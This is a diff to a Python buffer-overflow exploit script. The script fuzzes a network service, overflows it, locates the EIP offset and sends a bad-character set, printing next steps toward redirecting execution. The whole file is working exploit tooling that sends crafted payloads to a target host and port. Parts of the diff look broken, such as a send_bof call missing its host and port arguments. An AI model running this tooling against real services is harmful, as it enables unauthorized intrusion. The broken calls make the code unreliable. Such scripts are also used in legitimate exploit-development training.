@@ -9,19 +9,9 @@ import time
 parser = argparse.ArgumentParser()
 parser.add_argument('--generate-config-template',action='store_true')
 parser.add_argument('--use-local-config-file',action='store_true')
-parser.add_argument('--fuzz',action='store_true')
-parser.add_argument('--overflow',action='store_true')
-parser.add_argument('--host')
-parser.add_argument('--port',type=int)
-parser.add_argument('--prefix')
-parser.add_argument('--length',type=int)
 args = parser.parse_args()
 
-ip = args.host
-port = args.port
-target = (ip,port)
 timeout = 3
-prefix = args.prefix
 
 def use_local_config_file():
     import config
@@ -35,12 +25,16 @@ def use_local_config_file():
                 offset = config.settings['offset']
                 retn = config.settings['retn']
                 length = config.settings['length']
+                bad_chars = config.settings['bad_chars']
+                print("[*] Mode: %s" % mode)
                 if mode == 'fuzz':
                     fuzz()
                 elif mode == 'overflow':
                     overflow(host,port,prefix,length)
-                elif mode == 'control':
-                    control(host,port,prefix,offset,retn,length)
+                elif mode == 'offset':
+                    find_eip_offset(host,port,prefix,offset,retn,length)
+                elif mode == 'bad':
+                    send_bad_chars(host,port,prefix,offset,retn,length,bad_chars)
             except Exception as err:
                 print("[x] The %s key is missing from the settings variable." % err)
         else:
@@ -58,6 +52,7 @@ def generate_config_template():
     config.write("    'offset': 1978,\n")
     config.write("    'retn': 'BBBB',\n")
     config.write("    'length': 2400,\n")
+    config.write("    'bad_chars': ['\x00','\x0a','\x0d']\n")
     config.write("}\n")
     config.close()
     print("[+] Created a config.py template.")
@@ -84,6 +79,7 @@ def send_bof(bof,host,port):
             print("[+] Tango down!")
     except:
         print("[x] Failed to connect to port %d." % port)
+        exit()
 
 def fuzz():
     string = prefix + "A" * 100
@@ -115,44 +111,37 @@ def overflow(host,port,prefix,length):
         exit()
     suffix = ""
     bof = prefix + overflow + retn + padding + payload + suffix
-    try:
-        client = connect(host,port)
-        client.send(bytes(bof + "\r\n","latin-1"))
-        client.close()
-        print("[+] Sent BOF.")
-        try:
-            client = connect(host,port)
-            client.close()
-        except:
-            print("[+] Tango down!")
-    except:
-        print("[x] Failed to connect to port %d." % port)
+    send_bof(bof)
+    print("[!] Next step: Determine the offset of the EIP register in your BOF.")
 
-def control(host,port,prefix,offset,retn,length):
+def find_eip_offset(host,port,prefix,offset,retn,length):
     overflow = "A" * offset
     padding = ""
     payload = ""
     suffix = ""
     bof = prefix + overflow + retn + padding + payload + suffix
     send_bof(bof,host,port)
+    print("[!] Next step: Find bad characters.")
+
+def send_bad_chars(host,port,prefix,offset,retn,length,bad_chars):
+    overflow = "A" * offset
+    padding = ""
+    payload = ""
+    print("[*] Excluding: %s" % bad_chars)
+    bad_chars_in_integer_form = []
+    for char in bad_chars:
+        bad_chars_in_integer_form.append(ord(char))
+    for decimal in range(0, 256):
+        if decimal not in bad_chars_in_integer_form:
+            payload += chr(decimal)
+    payload = ''.join(payload)
+    suffix = ""
+    bof = prefix + overflow + retn + padding + payload + suffix
+    send_bof(bof,host,port)
+    print("[!] Next step: Find a JMP instruction to redirect program execution.")
 
 if __name__ == "__main__":
     if args.generate_config_template:
         generate_config_template()
     elif args.use_local_config_file:
         use_local_config_file()
-    elif not args.fuzz and not args.overflow:
-        print("[x] Please specify an option using either --fuzz or --flood.")
-    elif not args.host:
-        print("[x] Please specify a host using --host.")
-    elif not args.port:
-        print("[x] Please specify a port using --port.")
-    elif not args.prefix:
-        print("[x] Please specify a prefix using --prefix.")
-    elif args.fuzz:
-        fuzz()
-    elif args.overflow:
-        if args.length:
-            overflow(args.length)
-        else:
-            print("[x] Please specify a pattern length using --length.")
